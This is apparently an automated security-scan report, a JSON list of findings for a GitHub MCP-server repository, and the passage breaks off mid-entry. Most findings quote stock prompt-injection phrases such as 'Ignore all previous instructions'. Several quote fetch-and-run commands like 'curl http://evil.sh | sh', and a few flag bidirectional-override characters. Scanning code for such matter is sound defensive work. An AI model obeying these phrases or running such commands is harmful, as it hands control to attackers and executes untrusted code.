@@ -1,0 +1,1126 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "zhixuli0406/DuDuClaw",
+    "version": "bc986fea22b1cd7b38081bfdba4adfb025e723ea",
+    "download": "https://codeload.github.com/zhixuli0406/DuDuClaw/tar.gz/bc986fea22b1cd7b38081bfdba4adfb025e723ea"
+  },
+  "archive_sha256": "a75a04938d26566cb36c482095c9972a53e10e78f38e703bbb4d2d97bb7bfa23",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/CHANGELOG.md",
+      "line": 3764,
+      "evidence": "curl -fsSL https://x.ai/cli/install.sh | bash",
+      "file_sha256": "6917701934dacbff4e1a83fe767f41bf4638e0500a34d3cec3226a77116501f2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/evals/_privacy/README.md",
+      "line": 37,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "8f6a965f78a2e4ca944440c8d6d104503089ec3d68f065a0bd97e9ea147d6817"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/web/src/pages/MailPage.test.tsx",
+      "line": 55,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "519d888dab67faa19b01625b337720a314e75c50cd203b333a397660f9786028"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/web/src/pages/protected/restore/restore-ui.tsx",
+      "line": 107,
+      "evidence": "\\u{202a}",
+      "file_sha256": "607d74f4f19f7774db282ecd48f4b6d35f8febd41a6baa93b4e3d53eac855c0d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/web/src/pages/account/MyPersonalEmployeesTab.test.tsx",
+      "line": 15,
+      "evidence": "\\u{202e}",
+      "file_sha256": "cc84c2e102a253545ac5456d7029c2783ffc62dc7514baa372012fdd2ec54cb8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/wiki/reports/tl-daily/2026-09-29.md",
+      "line": 62,
+      "evidence": "curl … antigravity.google/cli/install.sh | bash",
+      "file_sha256": "c62b5df2eac295fc00d2c2bed8d2489575dfe6b6ec00c156ccfb6d3fdd1bfd68"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-odoo/src/rpc.rs",
+      "line": 262,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "47075cecaa32a8e9b6b6a685cac4c0a68bcfb3e340f50273b928c100bb276ccb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-odoo/src/schema.rs",
+      "line": 1360,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "c87a831212d356a8083b1afe8152934620879b27b9f895d1949241f9610f21d0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-odoo/src/connector.rs",
+      "line": 1002,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "f75d6ee2518e1098bb588dfa0f1737d024d7a03924ea071b16f4ade5a7aec36d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-odoo/src/edition.rs",
+      "line": 147,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "72b36cdca4ab2fc4e0d5647e786fed5e672c5edcee8d7d49b7f256054d5d5aea"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/workflow/pilot_test_factory.rs",
+      "line": 341,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "e00b0c0460d22be3394108df44845d87cfcecb64614e30f9ff4db8adc4d54057"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/agent_files/skill_rules.rs",
+      "line": 141,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "68df0831ece3376877fe69ad02debaf2548b548b74b5f5833487b044bf382b49"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/agent_files/rules.rs",
+      "line": 278,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "c9458b32d2821a7bfdf3a05b0aa7019e431b4fce1e0993c5e098e7d987b4a157"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/agent_files/external.rs",
+      "line": 271,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "f65fbec4ddb9260c97bb4acb7a871a393a8dfc92932319fa4ca7151746bc0b71"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/channel_reply/cli_spawn.rs",
+      "line": 668,
+      "evidence": "Ignore prior instructions",
+      "file_sha256": "4c4619f19b7a7909963244a0866d8638de255a0eecca9452b09bea381ed4f1e3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/group_context/tests.rs",
+      "line": 81,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "b632ff3b70624419c699ce3379b2d10f1abec6e64751384c6c846335fa28ea9b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/google_workspace/chat_read.rs",
+      "line": 199,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "12c0393f90c2937349a51c0323be9f595418a4744f3ac25b11498d227fb53c9d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/mail_worker.rs",
+      "line": 874,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "350ed83498e6ee83de17a5ab1dece65d32e70a460590ed52597386aaa08d38b1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/night_engine.rs",
+      "line": 1224,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "07678e22dab3dc78c2a3e57eadcbafa6c6c0cefccc52c871649e5a6b46417bf6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/auto_wiki_page.rs",
+      "line": 883,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "baf21390baf834078c0c71df12d0968cf2a4b69de42decbe1e04bf48b3eea541"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/expert_skills.rs",
+      "line": 482,
+      "evidence": "curl evil | sh",
+      "file_sha256": "072916c181c338ba8c7c67c25ca7a1d311d349dcdd71677277fb6acc170d3f26"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/responsibility/tests/round3_cases.rs",
+      "line": 531,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "6ad868f772675501e0779fdb90860ff1b926a249608ae4b2c95b02004ed416b5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/egress_guard/hook.rs",
+      "line": 240,
+      "evidence": "curl https://example.org | sh",
+      "file_sha256": "670023204922ae38909fd5d9fc07dfe11ed10d54cf70542aaceffbdc9056f36b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/company_templates.rs",
+      "line": 635,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "477ee7a5b4efccaf79cf9702915a3666a82ecf0e3d936c28398946f8c241ec31"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/os_intent.rs",
+      "line": 1332,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "335235f45faf638befc80fb2fe9e087941b08e4d0647cf070dd9556924aec0ac"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/mail.rs",
+      "line": 1223,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "281d5cd25e0611e72b75596aabca5121ae26ab389a70fbe615b76e742eefedab"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/knowledge_route.rs",
+      "line": 908,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "fcefb8df7403bb584aacc24459f9200b3addb0f0aba604bbbc0f1c1848775c6c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/workflow_drafts.rs",
+      "line": 279,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "2778cd27c650690aed16f3d9afb572df5cecc99414b5e1e6c9deb69aba037557"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/goal_intent.rs",
+      "line": 1548,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "2426a1a2ca3f0aa0d73f6cfdf372f51b1e9d971a21132d9091ab4d6845e4eeb5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/isolation_worker_plans_tests.rs",
+      "line": 56,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "dc55f630cf8a731e19645f5dd82f1359b78f0c7b61356c0abc4705359964a329"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/approval/tests/guard_cases.rs",
+      "line": 72,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "8c45e296a85ded3812a8a913eebb683801161aa2dafbbeded3bff1a10ad1b0d8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/codrive/atspi_locate.rs",
+      "line": 132,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "07691b09caa64d6c47d82d1c975c6673dea2a95a0698f6782d783946d09daf2e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/judge_mode.rs",
+      "line": 1808,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "8d184db5862b5d0bde45a0de7893dc8da6d11c5e91d9184f18cff6d41a0a0afb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/redteam.rs",
+      "line": 120,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "6a194df9947d18f58bab118f42be215e4b772119903a31cd673a38144b883c58"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/gvu/verifier.rs",
+      "line": 368,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "540f2d4599a8177da4535dd722bed4cc15ec359f8626ef98a8d367e353ca023a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/gvu/mistake_notebook.rs",
+      "line": 1152,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "35d62ef8490fa68fcfc24268ef4dd22716460c435478bb8c714a46444d89ce57"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/team_composer.rs",
+      "line": 8757,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "d69bd085c5d6adc3b7d3ad0b1a3d91127c7ee5553c78fb4fa7370386cb9213b8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/handlers/a2a_rpc/tests.rs",
+      "line": 262,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "d80d8a03adcab28418a7f2ce103f6ad1f886a5d3de09538d3a72d527db4a32ab"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/handlers/tests/agent_files_skill_tests.rs",
+      "line": 134,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "d6542b15e22e66ccb25414185e52f5b68a9c084b96e00d14a1750f2377e4a137"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/handlers/tests/cron_scoped_rpc_tests.rs",
+      "line": 167,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "3e290f810057f9ac75c847ec752cb683ead740c2d70e7f3e51129a3d41691d29"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/handlers/tests/agent_files_rpc_tests.rs",
+      "line": 357,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "930a7457d1d00c334763b14caad1a8643efaa5bcc9dd3e3ea6e3fb32e782e535"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/handlers/tests/odoo_credentials_display_tests.rs",
+      "line": 184,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "144e8f655a30ded66c291b658bb96521c063a3d1f697b2a994d662939e836834"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/handlers/tests/templates_library_tests.rs",
+      "line": 441,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "904f73ebd7546b857601eae4c6eaea1b981f3e8f0d6464c048b6dd6369f899b2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/runtime/grok.rs",
+      "line": 5,
+      "evidence": "curl -fsSL https://x.ai/cli/install.sh | bash",
+      "file_sha256": "05b4d09d96e5c426032ca74e477803fda8525f9a97aa47e70f028496d555d154"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/skill_lifecycle/security_scanner.rs",
+      "line": 438,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "bb519309e7d14da7ba6a839ed385d2bb8df8f342db01d9ecbfedc423385f240b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/skill_lifecycle/vetting.rs",
+      "line": 340,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "dd4f734eb74832126c59de3f1bc3666eadaa005070230c62e7a037bd1e7c18c3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/guardrail.rs",
+      "line": 44,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "088911692cb311d9c977c6f5be3b1a57eb8bf47213b139c1312f254a81d58df1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/computer_use_sessions/live_ops.rs",
+      "line": 719,
+      "evidence": "ignore all previous instructions",
+      "file_sha256": "9bd457076f42b8cca6842d2a48762d31694f217c394b4d5a275a2397eed15db7"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/computer_use_sessions/tests/workspace_cases.rs",
+      "line": 745,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "d4f7fddd90c1e4541eba799f17bd6f1ba2b55ebed490c5c5f3c0e516e5f7af99"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/computer_use_sessions/tests/live_cases.rs",
+      "line": 7,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "c7db5c9a9704f85046ed02085b4c4a9d5bc71454ce7bfaf848076de9ff958edd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/mcp_scan.rs",
+      "line": 264,
+      "evidence": "curl http://evil.sh | sh",
+      "file_sha256": "aea928bb91a1343baf8ed2cf62af4b91b1f0b96ab7e49df873363ad1f0857be0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/autopilot_engine.rs",
+      "line": 2574,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "25753cf6367be7302c1209a5d2812ae78b7489fa72eab268e2d3b13739a30823"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/wiki_ingest.rs",
+      "line": 3760,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "3f2d0b45659c3944f9d75433e3ddd95bb1a3d3d86d9e10cf5daacba45e62fbbb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/redaction_custom_rules.rs",
+      "line": 2281,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "988b3c8dbdbefe6a523af7c2786c228981ae0cba1bf02021f8c9f25fae19cedd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/runtime_install.rs",
+      "line": 266,
+      "evidence": "curl … | bash",
+      "file_sha256": "c5b9c13caf944d2a89828f261908f6f7d144e383376110ea982793cf8df610c1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/remote_mcp/oauth.rs",
+      "line": 806,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "a00e992868f65ed8ac2cca84253fd0b6d366d7bb6c4553d5cef2038a31c68b9d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/src/remote_mcp/connect.rs",
+      "line": 1384,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "3ed3dbad9ecedb9580dc6fb901955286434a133fd5de16dae2e7b74c70f6020d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/tests/remote_mcp_oauth_flow.rs",
+      "line": 187,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "f92236bb7f50e600d5681d4aadb1f440cffa016f5c8b49be8e08de8dda89f235"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-gateway/tests/mcp_events_flow.rs",
+      "line": 154,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "0eb38a39586298a2636682c239d259af9379b7e474576a14dedee4c8a64211aa"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-parse-worker/src/parsers/tests.rs",
+      "line": 227,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "f1deca409196b2885312a416550a7abce95a08c669cb3f86ce22b5dbfff2231b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/lib.rs",
+      "line": 12714,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "346c44607339b38110336379ff13eb6b01e053aae0830e36f5f3d6ff36559f58"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/mcp_dispatch.rs",
+      "line": 3028,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "92b922a94584151c3f72de65d686b64702de8268eafb7dc3442aebd0b329f677"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/expert/agent_config/skills.rs",
+      "line": 507,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "0fb2f819675b1fbc55979ecd8abebbc1a8f39a32dd1db1974cd790c497c10605"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/expert/agent_config/preview.rs",
+      "line": 318,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "4f992c82f1ce01666150e6bc0463a4edf1d30a6978b4b393fe2f658beb96cd94"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/expert/agent_config/tests.rs",
+      "line": 320,
+      "evidence": "curl x | sh",
+      "file_sha256": "e30f238016d47c82407121b57d5f12d80a3b049e65a9abd375c7c4ca64850449"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/expert/agent_config/tests.rs",
+      "line": 279,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "e30f238016d47c82407121b57d5f12d80a3b049e65a9abd375c7c4ca64850449"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/expert/tests.rs",
+      "line": 318,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "8e86c01643301ec103b0d006975f15bbb72a8c5d4cf5b3dd17180d456e7c10c5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/doctor_mcp_servers.rs",
+      "line": 224,
+      "evidence": "curl evil | sh",
+      "file_sha256": "d6d56591984fa91f7fedb505eb07fd67eafb79a1a22317824e67897eed79c9d8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "DuDuClaw-bc986fea22b1cd7b38081bfdba4adfb025e723ea/crates/duduclaw-cli/src/memory_namespace_cmd/tests.rs",
+      "line": 226,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "6e734f1d6c17ab848358b1e3aef249f4c630d5063daba2378b63893558c55e86"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
